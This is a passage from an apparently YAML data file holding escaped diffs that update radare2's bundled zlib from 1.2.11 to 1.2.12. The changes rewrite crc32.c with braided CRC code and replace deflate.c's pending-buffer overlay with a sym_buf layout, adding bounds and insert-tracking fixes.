    \ }\n \n-#ifdef BYFOUR\n+#else\n+\n+#ifdef W\n \n /*\n-   This BYFOUR code accesses\
    \ the passed unsigned char * buffer with a 32-bit\n-   integer pointer type. This\
    \ violates the strict aliasing rule, where a\n-   compiler can assume, for optimization\
    \ purposes, that two pointers to\n-   fundamentally different types won't ever\
    \ point to the same memory. This can\n-   manifest as a problem only if one of\
    \ the pointers is written to. This code\n-   only reads from those pointers. So\
    \ long as this code remains isolated in\n-   this compilation unit, there won't\
    \ be a problem. For this reason, this code\n-   should not be copied and pasted\
    \ into a compilation unit in which other code\n-   writes to the buffer that is\
    \ passed to these routines.\n+  Return the CRC of the W bytes in the word_t data,\
    \ taking the\n+  least-significant byte of the word as the first byte of data,\
    \ without any pre\n+  or post conditioning. This is used to combine the CRCs of\
    \ each braid.\n  */\n+local z_crc_t crc_word(data)\n+    z_word_t data;\n+{\n\
    +    int k;\n+    for (k = 0; k < W; k++)\n+        data = (data >> 8) ^ crc_table[data\
    \ & 0xff];\n+    return (z_crc_t)data;\n+}\n \n-/* =========================================================================\
    \ */\n-#define DOLIT4 c ^= *buf4++; \\\n-        c = crc_table[3][c & 0xff] ^\
    \ crc_table[2][(c >> 8) & 0xff] ^ \\\n-            crc_table[1][(c >> 16) & 0xff]\
    \ ^ crc_table[0][c >> 24]\n-#define DOLIT32 DOLIT4; DOLIT4; DOLIT4; DOLIT4; DOLIT4;\
    \ DOLIT4; DOLIT4; DOLIT4\n+local z_word_t crc_word_big(data)\n+    z_word_t data;\n\
    +{\n+    int k;\n+    for (k = 0; k < W; k++)\n+        data = (data << 8) ^\n\
    +            crc_big_table[(data >> ((W - 1) << 3)) & 0xff];\n+    return data;\n\
    +}\n+\n+#endif\n \n /* =========================================================================\
    \ */\n-local unsigned long crc32_little(crc, buf, len)\n+unsigned long ZEXPORT\
    \ crc32_z(crc, buf, len)\n     unsigned long crc;\n     const unsigned char FAR\
    \ *buf;\n     z_size_t len;\n {\n-    register z_crc_t c;\n-    register const\
    \ z_crc_t FAR *buf4;\n+    /* Return initial CRC, if requested. */\n+    if (buf\
    \ == Z_NULL) return 0;\n \n-    c = (z_crc_t)crc;\n-    c = ~c;\n-    while (len\
    \ && ((ptrdiff_t)buf & 3)) {\n-        c = crc_table[0][(c ^ *buf++) & 0xff] ^\
    \ (c >> 8);\n-        len--;\n-    }\n+#ifdef DYNAMIC_CRC_TABLE\n+    once(&made,\
    \ make_crc_table);\n+#endif /* DYNAMIC_CRC_TABLE */\n \n-    buf4 = (const z_crc_t\
    \ FAR *)(const void FAR *)buf;\n-    while (len >= 32) {\n-        DOLIT32;\n\
    -        len -= 32;\n-    }\n-    while (len >= 4) {\n-        DOLIT4;\n-    \
    \    len -= 4;\n-    }\n-    buf = (const unsigned char FAR *)buf4;\n+    /* Pre-condition\
    \ the CRC */\n+    crc ^= 0xffffffff;\n \n-    if (len) do {\n-        c = crc_table[0][(c\
    \ ^ *buf++) & 0xff] ^ (c >> 8);\n-    } while (--len);\n-    c = ~c;\n-    return\
    \ (unsigned long)c;\n-}\n+#ifdef W\n \n-/* =========================================================================\
    \ */\n-#define DOBIG4 c ^= *buf4++; \\\n-        c = crc_table[4][c & 0xff] ^\
    \ crc_table[5][(c >> 8) & 0xff] ^ \\\n-            crc_table[6][(c >> 16) & 0xff]\
    \ ^ crc_table[7][c >> 24]\n-#define DOBIG32 DOBIG4; DOBIG4; DOBIG4; DOBIG4; DOBIG4;\
    \ DOBIG4; DOBIG4; DOBIG4\n+    /* If provided enough bytes, do a braided CRC calculation.\
    \ */\n+    if (len >= N * W + W - 1) {\n+        z_size_t blks;\n+        z_word_t\
    \ const *words;\n+        unsigned endian;\n+        int k;\n \n-/* =========================================================================\
    \ */\n-local unsigned long crc32_big(crc, buf, len)\n-    unsigned long crc;\n\
    -    const unsigned char FAR *buf;\n-    z_size_t len;\n-{\n-    register z_crc_t\
    \ c;\n-    register const z_crc_t FAR *buf4;\n+        /* Compute the CRC up to\
    \ a z_word_t boundary. */\n+        while (len && ((z_size_t)buf & (W - 1)) !=\
    \ 0) {\n+            len--;\n+            crc = (crc >> 8) ^ crc_table[(crc ^\
    \ *buf++) & 0xff];\n+        }\n \n-    c = ZSWAP32((z_crc_t)crc);\n-    c = ~c;\n\
    -    while (len && ((ptrdiff_t)buf & 3)) {\n-        c = crc_table[4][(c >> 24)\
    \ ^ *buf++] ^ (c << 8);\n-        len--;\n+        /* Compute the CRC on as many\
    \ N z_word_t blocks as are available. */\n+        blks = len / (N * W);\n+  \
    \      len -= blks * N * W;\n+        words = (z_word_t const *)buf;\n+\n+   \
    \     /* Do endian check at execution time instead of compile time, since ARM\n\
    +           processors can change the endianess at execution time. If the\n+ \
    \          compiler knows what the endianess will be, it can optimize out the\n\
    +           check and the unused branch. */\n+        endian = 1;\n+        if\
    \ (*(unsigned char *)&endian) {\n+            /* Little endian. */\n+\n+     \
    \       z_crc_t crc0;\n+            z_word_t word0;\n+#if N > 1\n+           \
    \ z_crc_t crc1;\n+            z_word_t word1;\n+#if N > 2\n+            z_crc_t\
    \ crc2;\n+            z_word_t word2;\n+#if N > 3\n+            z_crc_t crc3;\n\
    +            z_word_t word3;\n+#if N > 4\n+            z_crc_t crc4;\n+      \
    \      z_word_t word4;\n+#if N > 5\n+            z_crc_t crc5;\n+            z_word_t\
    \ word5;\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+\n+            /* Initialize\
    \ the CRC for each braid. */\n+            crc0 = crc;\n+#if N > 1\n+        \
    \    crc1 = 0;\n+#if N > 2\n+            crc2 = 0;\n+#if N > 3\n+            crc3\
    \ = 0;\n+#if N > 4\n+            crc4 = 0;\n+#if N > 5\n+            crc5 = 0;\n\
    +#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+\n+            /*\n+           \
    \   Process the first blks-1 blocks, computing the CRCs on each braid\n+     \
    \         independently.\n+             */\n+            while (--blks) {\n+ \
    \               /* Load the word for each braid into registers. */\n+        \
    \        word0 = crc0 ^ words[0];\n+#if N > 1\n+                word1 = crc1 ^\
    \ words[1];\n+#if N > 2\n+                word2 = crc2 ^ words[2];\n+#if N > 3\n\
    +                word3 = crc3 ^ words[3];\n+#if N > 4\n+                word4\
    \ = crc4 ^ words[4];\n+#if N > 5\n+                word5 = crc5 ^ words[5];\n\
    +#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+                words += N;\n+\n\
    +                /* Compute and update the CRC for each word. The loop should\n\
    +                   get unrolled. */\n+                crc0 = crc_braid_table[0][word0\
    \ & 0xff];\n+#if N > 1\n+                crc1 = crc_braid_table[0][word1 & 0xff];\n\
    +#if N > 2\n+                crc2 = crc_braid_table[0][word2 & 0xff];\n+#if N\
    \ > 3\n+                crc3 = crc_braid_table[0][word3 & 0xff];\n+#if N > 4\n\
    +                crc4 = crc_braid_table[0][word4 & 0xff];\n+#if N > 5\n+     \
    \           crc5 = crc_braid_table[0][word5 & 0xff];\n+#endif\n+#endif\n+#endif\n\
    +#endif\n+#endif\n+                for (k = 1; k < W; k++) {\n+              \
    \      crc0 ^= crc_braid_table[k][(word0 >> (k << 3)) & 0xff];\n+#if N > 1\n+\
    \                    crc1 ^= crc_braid_table[k][(word1 >> (k << 3)) & 0xff];\n\
    +#if N > 2\n+                    crc2 ^= crc_braid_table[k][(word2 >> (k << 3))\
    \ & 0xff];\n+#if N > 3\n+                    crc3 ^= crc_braid_table[k][(word3\
    \ >> (k << 3)) & 0xff];\n+#if N > 4\n+                    crc4 ^= crc_braid_table[k][(word4\
    \ >> (k << 3)) & 0xff];\n+#if N > 5\n+                    crc5 ^= crc_braid_table[k][(word5\
    \ >> (k << 3)) & 0xff];\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+      \
    \          }\n+            }\n+\n+            /*\n+              Process the last\
    \ block, combining the CRCs of the N braids at the\n+              same time.\n\
    +             */\n+            crc = crc_word(crc0 ^ words[0]);\n+#if N > 1\n\
    +            crc = crc_word(crc1 ^ words[1] ^ crc);\n+#if N > 2\n+           \
    \ crc = crc_word(crc2 ^ words[2] ^ crc);\n+#if N > 3\n+            crc = crc_word(crc3\
    \ ^ words[3] ^ crc);\n+#if N > 4\n+            crc = crc_word(crc4 ^ words[4]\
    \ ^ crc);\n+#if N > 5\n+            crc = crc_word(crc5 ^ words[5] ^ crc);\n+#endif\n\
    +#endif\n+#endif\n+#endif\n+#endif\n+            words += N;\n+        }\n+  \
    \      else {\n+            /* Big endian. */\n+\n+            z_word_t crc0,\
    \ word0, comb;\n+#if N > 1\n+            z_word_t crc1, word1;\n+#if N > 2\n+\
    \            z_word_t crc2, word2;\n+#if N > 3\n+            z_word_t crc3, word3;\n\
    +#if N > 4\n+            z_word_t crc4, word4;\n+#if N > 5\n+            z_word_t\
    \ crc5, word5;\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+\n+            /*\
    \ Initialize the CRC for each braid. */\n+            crc0 = byte_swap(crc);\n\
    +#if N > 1\n+            crc1 = 0;\n+#if N > 2\n+            crc2 = 0;\n+#if N\
    \ > 3\n+            crc3 = 0;\n+#if N > 4\n+            crc4 = 0;\n+#if N > 5\n\
    +            crc5 = 0;\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+\n+    \
    \        /*\n+              Process the first blks-1 blocks, computing the CRCs\
    \ on each braid\n+              independently.\n+             */\n+          \
    \  while (--blks) {\n+                /* Load the word for each braid into registers.\
    \ */\n+                word0 = crc0 ^ words[0];\n+#if N > 1\n+               \
    \ word1 = crc1 ^ words[1];\n+#if N > 2\n+                word2 = crc2 ^ words[2];\n\
    +#if N > 3\n+                word3 = crc3 ^ words[3];\n+#if N > 4\n+         \
    \       word4 = crc4 ^ words[4];\n+#if N > 5\n+                word5 = crc5 ^\
    \ words[5];\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+                words\
    \ += N;\n+\n+                /* Compute and update the CRC for each word. The\
    \ loop should\n+                   get unrolled. */\n+                crc0 = crc_braid_big_table[0][word0\
    \ & 0xff];\n+#if N > 1\n+                crc1 = crc_braid_big_table[0][word1 &\
    \ 0xff];\n+#if N > 2\n+                crc2 = crc_braid_big_table[0][word2 & 0xff];\n\
    +#if N > 3\n+                crc3 = crc_braid_big_table[0][word3 & 0xff];\n+#if\
    \ N > 4\n+                crc4 = crc_braid_big_table[0][word4 & 0xff];\n+#if N\
    \ > 5\n+                crc5 = crc_braid_big_table[0][word5 & 0xff];\n+#endif\n\
    +#endif\n+#endif\n+#endif\n+#endif\n+                for (k = 1; k < W; k++) {\n\
    +                    crc0 ^= crc_braid_big_table[k][(word0 >> (k << 3)) & 0xff];\n\
    +#if N > 1\n+                    crc1 ^= crc_braid_big_table[k][(word1 >> (k <<\
    \ 3)) & 0xff];\n+#if N > 2\n+                    crc2 ^= crc_braid_big_table[k][(word2\
    \ >> (k << 3)) & 0xff];\n+#if N > 3\n+                    crc3 ^= crc_braid_big_table[k][(word3\
    \ >> (k << 3)) & 0xff];\n+#if N > 4\n+                    crc4 ^= crc_braid_big_table[k][(word4\
    \ >> (k << 3)) & 0xff];\n+#if N > 5\n+                    crc5 ^= crc_braid_big_table[k][(word5\
    \ >> (k << 3)) & 0xff];\n+#endif\n+#endif\n+#endif\n+#endif\n+#endif\n+      \
    \          }\n+            }\n+\n+            /*\n+              Process the last\
    \ block, combining the CRCs of the N braids at the\n+              same time.\n\
    +             */\n+            comb = crc_word_big(crc0 ^ words[0]);\n+#if N >\
    \ 1\n+            comb = crc_word_big(crc1 ^ words[1] ^ comb);\n+#if N > 2\n+\
    \            comb = crc_word_big(crc2 ^ words[2] ^ comb);\n+#if N > 3\n+     \
    \       comb = crc_word_big(crc3 ^ words[3] ^ comb);\n+#if N > 4\n+          \
    \  comb = crc_word_big(crc4 ^ words[4] ^ comb);\n+#if N > 5\n+            comb\
    \ = crc_word_big(crc5 ^ words[5] ^ comb);\n+#endif\n+#endif\n+#endif\n+#endif\n\
    +#endif\n+            words += N;\n+            crc = byte_swap(comb);\n+    \
    \    }\n+\n+        /*\n+          Update the pointer to the remaining bytes to\
    \ process.\n+         */\n+        buf = (unsigned char const *)words;\n     }\n\
    \ \n-    buf4 = (const z_crc_t FAR *)(const void FAR *)buf;\n-    while (len >=\
    \ 32) {\n-        DOBIG32;\n-        len -= 32;\n+#endif /* W */\n+\n+    /* Complete\
    \ the computation of the CRC on any remaining bytes. */\n+    while (len >= 8)\
    \ {\n+        len -= 8;\n+        crc = (crc >> 8) ^ crc_table[(crc ^ *buf++)\
    \ & 0xff];\n+        crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n+ \
    \       crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n+        crc = (crc\
    \ >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n+        crc = (crc >> 8) ^ crc_table[(crc\
    \ ^ *buf++) & 0xff];\n+        crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n\
    +        crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n+        crc =\
    \ (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n     }\n-    while (len >= 4)\
    \ {\n-        DOBIG4;\n-        len -= 4;\n+    while (len) {\n+        len--;\n\
    +        crc = (crc >> 8) ^ crc_table[(crc ^ *buf++) & 0xff];\n     }\n-    buf\
    \ = (const unsigned char FAR *)buf4;\n \n-    if (len) do {\n-        c = crc_table[4][(c\
    \ >> 24) ^ *buf++] ^ (c << 8);\n-    } while (--len);\n-    c = ~c;\n-    return\
    \ (unsigned long)(ZSWAP32(c));\n+    /* Return the CRC, post-conditioned. */\n\
    +    return crc ^ 0xffffffff;\n }\n \n-#endif /* BYFOUR */\n-\n-#define GF2_DIM\
    \ 32      /* dimension of GF(2) vectors (length of CRC) */\n+#endif\n \n /* =========================================================================\
    \ */\n-local unsigned long gf2_matrix_times(mat, vec)\n-    unsigned long *mat;\n\
    -    unsigned long vec;\n+unsigned long ZEXPORT crc32(crc, buf, len)\n+    unsigned\
    \ long crc;\n+    const unsigned char FAR *buf;\n+    uInt len;\n {\n-    unsigned\
    \ long sum;\n-\n-    sum = 0;\n-    while (vec) {\n-        if (vec & 1)\n-  \
    \          sum ^= *mat;\n-        vec >>= 1;\n-        mat++;\n-    }\n-    return\
    \ sum;\n+    return crc32_z(crc, buf, len);\n }\n \n /* =========================================================================\
    \ */\n-local void gf2_matrix_square(square, mat)\n-    unsigned long *square;\n\
    -    unsigned long *mat;\n+uLong ZEXPORT crc32_combine64(crc1, crc2, len2)\n+\
    \    uLong crc1;\n+    uLong crc2;\n+    z_off64_t len2;\n {\n-    int n;\n-\n\
    -    for (n = 0; n < GF2_DIM; n++)\n-        square[n] = gf2_matrix_times(mat,\
    \ mat[n]);\n+#ifdef DYNAMIC_CRC_TABLE\n+    once(&made, make_crc_table);\n+#endif\
    \ /* DYNAMIC_CRC_TABLE */\n+    return multmodp(x2nmodp(len2, 3), crc1) ^ crc2;\n\
    \ }\n \n /* =========================================================================\
    \ */\n-local uLong crc32_combine_(crc1, crc2, len2)\n+uLong ZEXPORT crc32_combine(crc1,\
    \ crc2, len2)\n     uLong crc1;\n     uLong crc2;\n-    z_off64_t len2;\n+   \
    \ z_off_t len2;\n {\n-    int n;\n-    unsigned long row;\n-    unsigned long\
    \ even[GF2_DIM];    /* even-power-of-two zeros operator */\n-    unsigned long\
    \ odd[GF2_DIM];     /* odd-power-of-two zeros operator */\n-\n-    /* degenerate\
    \ case (also disallow negative lengths) */\n-    if (len2 <= 0)\n-        return\
    \ crc1;\n-\n-    /* put operator for one zero bit in odd */\n-    odd[0] = 0xedb88320UL;\
    \          /* CRC-32 polynomial */\n-    row = 1;\n-    for (n = 1; n < GF2_DIM;\
    \ n++) {\n-        odd[n] = row;\n-        row <<= 1;\n-    }\n+    return crc32_combine64(crc1,\
    \ crc2, len2);\n+}\n \n-    /* put operator for two zero bits in even */\n-  \
    \  gf2_matrix_square(even, odd);\n-\n-    /* put operator for four zero bits in\
    \ odd */\n-    gf2_matrix_square(odd, even);\n-\n-    /* apply len2 zeros to crc1\
    \ (first square will put the operator for one\n-       zero byte, eight zero bits,\
    \ in even) */\n-    do {\n-        /* apply zeros operator for this bit of len2\
    \ */\n-        gf2_matrix_square(even, odd);\n-        if (len2 & 1)\n-      \
    \      crc1 = gf2_matrix_times(even, crc1);\n-        len2 >>= 1;\n-\n-      \
    \  /* if no more bits set, then done */\n-        if (len2 == 0)\n-          \
    \  break;\n-\n-        /* another iteration of the loop with odd and even swapped\
    \ */\n-        gf2_matrix_square(odd, even);\n-        if (len2 & 1)\n-      \
    \      crc1 = gf2_matrix_times(odd, crc1);\n-        len2 >>= 1;\n-\n-       \
    \ /* if no more bits set, then done */\n-    } while (len2 != 0);\n-\n-    /*\
    \ return combined crc */\n-    crc1 ^= crc2;\n-    return crc1;\n+/* =========================================================================\
    \ */\n+uLong ZEXPORT crc32_combine_gen64(len2)\n+    z_off64_t len2;\n+{\n+#ifdef\
    \ DYNAMIC_CRC_TABLE\n+    once(&made, make_crc_table);\n+#endif /* DYNAMIC_CRC_TABLE\
    \ */\n+    return x2nmodp(len2, 3);\n }\n \n /* =========================================================================\
    \ */\n-uLong ZEXPORT crc32_combine(crc1, crc2, len2)\n-    uLong crc1;\n-    uLong\
    \ crc2;\n+uLong ZEXPORT crc32_combine_gen(len2)\n     z_off_t len2;\n {\n-   \
    \ return crc32_combine_(crc1, crc2, len2);\n+    return crc32_combine_gen64(len2);\n\
    \ }\n \n-uLong ZEXPORT crc32_combine64(crc1, crc2, len2)\n+/* =========================================================================\
    \ */\n+uLong crc32_combine_op(crc1, crc2, op)\n     uLong crc1;\n     uLong crc2;\n\
    -    z_off64_t len2;\n+    uLong op;\n {\n-    return crc32_combine_(crc1, crc2,\
    \ len2);\n+    return multmodp(op, crc1) ^ crc2;\n }"
  - "--- a/shlr/zip/zlib/deflate.c\n+++ b/shlr/zip/zlib/deflate.c\n@@ -1,5 +1,5 @@\n\
    \ /* deflate.c -- compress data using the deflation algorithm\n- * Copyright (C)\
    \ 1995-2017 Jean-loup Gailly and Mark Adler\n+ * Copyright (C) 1995-2022 Jean-loup\
    \ Gailly and Mark Adler\n  * For conditions of distribution and use, see copyright\
    \ notice in zlib.h\n  */\n \n@@ -52,7 +52,7 @@\n #include \"deflate.h\"\n \n const\
    \ char deflate_copyright[] =\n-   \" deflate 1.2.11 Copyright 1995-2017 Jean-loup\
    \ Gailly and Mark Adler \";\n+   \" deflate 1.2.12 Copyright 1995-2022 Jean-loup\
    \ Gailly and Mark Adler \";\n /*\n   If you use the zlib library in a product,\
    \ an acknowledgment is welcome\n   in the documentation of your product. If for\
    \ some reason you cannot\n@@ -190,8 +190,11 @@ local const config configuration_table[10]\
    \ = {\n  * prev[] will be initialized on the fly.\n  */\n #define CLEAR_HASH(s)\
    \ \\\n-    s->head[s->hash_size-1] = NIL; \\\n-    zmemzero((Bytef *)s->head,\
    \ (unsigned)(s->hash_size-1)*sizeof(*s->head));\n+    do { \\\n+        s->head[s->hash_size-1]\
    \ = NIL; \\\n+        zmemzero((Bytef *)s->head, \\\n+                 (unsigned)(s->hash_size-1)*sizeof(*s->head));\
    \ \\\n+    } while (0)\n \n /* ===========================================================================\n\
    \  * Slide the hash table when sliding the window down (could be avoided with\
    \ 32\n@@ -252,11 +255,6 @@ int ZEXPORT deflateInit2_(strm, level, method, windowBits,\
    \ memLevel, strategy,\n     int wrap = 1;\n     static const char my_version[]\
    \ = ZLIB_VERSION;\n \n-    ushf *overlay;\n-    /* We overlay pending_buf and\
    \ d_buf+l_buf. This works since the average\n-     * output size for (length,distance)\
    \ codes is <= 24 bits.\n-     */\n-\n     if (version == Z_NULL || version[0]\
    \ != my_version[0] ||\n         stream_size != sizeof(z_stream)) {\n         return\
    \ Z_VERSION_ERROR;\n@@ -326,9 +324,47 @@ int ZEXPORT deflateInit2_(strm, level,\
    \ method, windowBits, memLevel, strategy,\n \n     s->lit_bufsize = 1 << (memLevel\
    \ + 6); /* 16K elements by default */\n \n-    overlay = (ushf *) ZALLOC(strm,\
    \ s->lit_bufsize, sizeof(ush)+2);\n-    s->pending_buf = (uchf *) overlay;\n-\
    \    s->pending_buf_size = (ulg)s->lit_bufsize * (sizeof(ush)+2L);\n+    /* We\
    \ overlay pending_buf and sym_buf. This works since the average size\n+     *\
    \ for length/distance pairs over any compressed block is assured to be 31\n+ \
    \    * bits or less.\n+     *\n+     * Analysis: The longest fixed codes are a\
    \ length code of 8 bits plus 5\n+     * extra bits, for lengths 131 to 257. The\
    \ longest fixed distance codes are\n+     * 5 bits plus 13 extra bits, for distances\
    \ 16385 to 32768. The longest\n+     * possible fixed-codes length/distance pair\
    \ is then 31 bits total.\n+     *\n+     * sym_buf starts one-fourth of the way\
    \ into pending_buf. So there are\n+     * three bytes in sym_buf for every four\
    \ bytes in pending_buf. Each symbol\n+     * in sym_buf is three bytes -- two\
    \ for the distance and one for the\n+     * literal/length. As each symbol is\
    \ consumed, the pointer to the next\n+     * sym_buf value to read moves forward\
    \ three bytes. From that symbol, up to\n+     * 31 bits are written to pending_buf.\
    \ The closest the written pending_buf\n+     * bits gets to the next sym_buf symbol\
    \ to read is just before the last\n+     * code is written. At that time, 31*(n-2)\
    \ bits have been written, just\n+     * after 24*(n-2) bits have been consumed\
    \ from sym_buf. sym_buf starts at\n+     * 8*n bits into pending_buf. (Note that\
    \ the symbol buffer fills when n-1\n+     * symbols are written.) The closest\
    \ the writing gets to what is unread is\n+     * then n+14 bits. Here n is lit_bufsize,\
    \ which is 16384 by default, and\n+     * can range from 128 to 32768.\n+    \
    \ *\n+     * Therefore, at a minimum, there are 142 bits of space between what\
    \ is\n+     * written and what is read in the overlain buffers, so the symbols\
    \ cannot\n+     * be overwritten by the compressed data. That space is actually\
    \ 139 bits,\n+     * due to the three-bit fixed-code block header.\n+     *\n\
    +     * That covers the case where either Z_FIXED is specified, forcing fixed\n\
    +     * codes, or when the use of fixed codes is chosen, because that choice\n\
    +     * results in a smaller compressed block than dynamic codes. That latter\n\
    +     * condition then assures that the above analysis also covers all dynamic\n\
    +     * blocks. A dynamic-code block will only be chosen to be emitted if it has\n\
    +     * fewer bits than a fixed-code block would for the same set of symbols.\n\
    +     * Therefore its average symbol length is assured to be less than 31. So\n\
    +     * the compressed data for a dynamic block also cannot overwrite the\n+ \
    \    * symbols from which it is being constructed.\n+     */\n+\n+    s->pending_buf\
    \ = (uchf *) ZALLOC(strm, s->lit_bufsize, 4);\n+    s->pending_buf_size = (ulg)s->lit_bufsize\
    \ * 4;\n \n     if (s->window == Z_NULL || s->prev == Z_NULL || s->head == Z_NULL\
    \ ||\n         s->pending_buf == Z_NULL) {\n@@ -337,8 +373,12 @@ int ZEXPORT deflateInit2_(strm,\
    \ level, method, windowBits, memLevel, strategy,\n         deflateEnd (strm);\n\
    \         return Z_MEM_ERROR;\n     }\n-    s->d_buf = overlay + s->lit_bufsize/sizeof(ush);\n\
    -    s->l_buf = s->pending_buf + (1+sizeof(ush))*s->lit_bufsize;\n+    s->sym_buf\
    \ = s->pending_buf + s->lit_bufsize;\n+    s->sym_end = (s->lit_bufsize - 1) *\
    \ 3;\n+    /* We avoid equality with lit_bufsize*3 because of wraparound at 64K\n\
    +     * on 16 bit machines and because stored blocks are restricted to\n+    \
    \ * 64K-1 bytes.\n+     */\n \n     s->level = level;\n     s->strategy = strategy;\n\
    @@ -488,13 +528,13 @@ int ZEXPORT deflateResetKeep (strm)\n #ifdef GZIP\n    \
    \     s->wrap == 2 ? GZIP_STATE :\n #endif\n-        s->wrap ? INIT_STATE : BUSY_STATE;\n\
    +        INIT_STATE;\n     strm->adler =\n #ifdef GZIP\n         s->wrap == 2\
    \ ? crc32(0L, Z_NULL, 0) :\n #endif\n         adler32(0L, Z_NULL, 0);\n-    s->last_flush\
    \ = Z_NO_FLUSH;\n+    s->last_flush = -2;\n \n     _tr_init(s);\n \n@@ -549,7\
    \ +589,8 @@ int ZEXPORT deflatePrime (strm, bits, value)\n \n     if (deflateStateCheck(strm))\
    \ return Z_STREAM_ERROR;\n     s = strm->state;\n-    if ((Bytef *)(s->d_buf)\
    \ < s->pending_out + ((Buf_size + 7) >> 3))\n+    if (bits < 0 || bits > 16 ||\n\
    +        s->sym_buf < s->pending_out + ((Buf_size + 7) >> 3))\n         return\
    \ Z_BUF_ERROR;\n     do {\n         put = Buf_size - s->bi_valid;\n@@ -587,12\
    \ +628,12 @@ int ZEXPORT deflateParams(strm, level, strategy)\n     func = configuration_table[s->level].func;\n\
    \ \n     if ((strategy != s->strategy || func != configuration_table[level].func)\
    \ &&\n-        s->high_water) {\n+        s->last_flush != -2) {\n         /*\
    \ Flush the last buffer: */\n         int err = deflate(strm, Z_BLOCK);\n    \
    \     if (err == Z_STREAM_ERROR)\n             return err;\n-        if (strm->avail_out\
    \ == 0)\n+        if (strm->avail_in || (s->strstart - s->block_start) + s->lookahead)\n\
    \             return Z_BUF_ERROR;\n     }\n     if (s->level != level) {\n@@ -811,6\
    \ +852,8 @@ int ZEXPORT deflate (strm, flush)\n     }\n \n     /* Write the header\
    \ */\n+    if (s->status == INIT_STATE && s->wrap == 0)\n+        s->status =\
    \ BUSY_STATE;\n     if (s->status == INIT_STATE) {\n         /* zlib header */\n\
    \         uInt header = (Z_DEFLATED + ((s->w_bits-8)<<4)) << 8;\n@@ -1108,7 +1151,6\
    \ @@ int ZEXPORT deflateCopy (dest, source)\n #else\n     deflate_state *ds;\n\
    \     deflate_state *ss;\n-    ushf *overlay;\n \n \n     if (deflateStateCheck(source)\
    \ || dest == Z_NULL) {\n@@ -1128,8 +1170,7 @@ int ZEXPORT deflateCopy (dest, source)\n\
    \     ds->window = (Bytef *) ZALLOC(dest, ds->w_size, 2*sizeof(Byte));\n     ds->prev\
    \   = (Posf *)  ZALLOC(dest, ds->w_size, sizeof(Pos));\n     ds->head   = (Posf\
    \ *)  ZALLOC(dest, ds->hash_size, sizeof(Pos));\n-    overlay = (ushf *) ZALLOC(dest,\
    \ ds->lit_bufsize, sizeof(ush)+2);\n-    ds->pending_buf = (uchf *) overlay;\n\
    +    ds->pending_buf = (uchf *) ZALLOC(dest, ds->lit_bufsize, 4);\n \n     if\
    \ (ds->window == Z_NULL || ds->prev == Z_NULL || ds->head == Z_NULL ||\n     \
    \    ds->pending_buf == Z_NULL) {\n@@ -1143,8 +1184,7 @@ int ZEXPORT deflateCopy\
    \ (dest, source)\n     zmemcpy(ds->pending_buf, ss->pending_buf, (uInt)ds->pending_buf_size);\n\
    \ \n     ds->pending_out = ds->pending_buf + (ss->pending_out - ss->pending_buf);\n\
    -    ds->d_buf = overlay + ds->lit_bufsize/sizeof(ush);\n-    ds->l_buf = ds->pending_buf\
    \ + (1+sizeof(ush))*ds->lit_bufsize;\n+    ds->sym_buf = ds->pending_buf + ds->lit_bufsize;\n\
    \ \n     ds->l_desc.dyn_tree = ds->dyn_ltree;\n     ds->d_desc.dyn_tree = ds->dyn_dtree;\n\
    @@ -1513,6 +1553,8 @@ local void fill_window(s)\n             s->match_start -=\
    \ wsize;\n             s->strstart    -= wsize; /* we now have strstart >= MAX_DIST\
    \ */\n             s->block_start -= (long) wsize;\n+            if (s->insert\
    \ > s->strstart)\n+                s->insert = s->strstart;\n             slide_hash(s);\n\
    \             more += wsize;\n         }\n@@ -1742,6 +1784,7 @@ local block_state\
    \ deflate_stored(s, flush)\n             s->matches = 2;         /* clear hash\
    \ */\n             zmemcpy(s->window, s->strm->next_in - s->w_size, s->w_size);\n\
    \             s->strstart = s->w_size;\n+            s->insert = s->strstart;\n\
    \         }\n         else {\n             if (s->window_size - s->strstart <=\
    \ used) {\n@@ -1750,12 +1793,14 @@ local block_state deflate_stored(s, flush)\n\
    \                 zmemcpy(s->window, s->window + s->w_size, s->strstart);\n  \
    \               if (s->matches < 2)\n                     s->matches++;   /* add\
    \ a pending slide_hash() */\n+                if (s->insert > s->strstart)\n+\
    \                    s->insert = s->strstart;\n             }\n             zmemcpy(s->window\
    \ + s->strstart, s->strm->next_in - used, used);\n             s->strstart +=\
    \ used;\n+            s->insert += MIN(used, s->w_size - s->insert);\n       \
    \  }\n         s->block_start = s->strstart;\n-        s->insert += MIN(used,\
    \ s->w_size - s->insert);\n     }\n     if (s->high_water < s->strstart)\n   \
    \      s->high_water = s->strstart;\n@@ -1770,7 +1815,7 @@ local block_state deflate_stored(s,\
    \ flush)\n         return block_done;\n \n     /* Fill the window with any remaining\
    \ input. */\n-    have = s->window_size - s->strstart - 1;\n+    have = s->window_size\
    \ - s->strstart;\n     if (s->strm->avail_in > have && s->block_start >= (long)s->w_size)\
    \ {\n         /* Slide the window down. */\n         s->block_start -= s->w_size;\n\
    @@ -1779,12 +1824,15 @@ local block_state deflate_stored(s, flush)\n         if\
    \ (s->matches < 2)\n             s->matches++;           /* add a pending slide_hash()\
    \ */\n         have += s->w_size;          /* more space now */\n+        if (s->insert\
    \ > s->strstart)\n+            s->insert = s->strstart;\n     }\n     if (have\
    \ > s->strm->avail_in)\n         have = s->strm->avail_in;\n     if (have) {\n\
    \         read_buf(s->strm, s->window + s->strstart, have);\n         s->strstart\
    \ += have;\n+        s->insert += MIN(have, s->w_size - s->insert);\n     }\n\
    \     if (s->high_water < s->strstart)\n         s->high_water = s->strstart;\n\
    @@ -1912,7 +1960,7 @@ local block_state deflate_fast(s, flush)\n         FLUSH_BLOCK(s,\
    \ 1);\n         return finish_done;\n     }\n-    if (s->last_lit)\n+    if (s->sym_next)\n\
    \         FLUSH_BLOCK(s, 0);\n     return block_done;\n }\n@@ -2043,7 +2091,7\
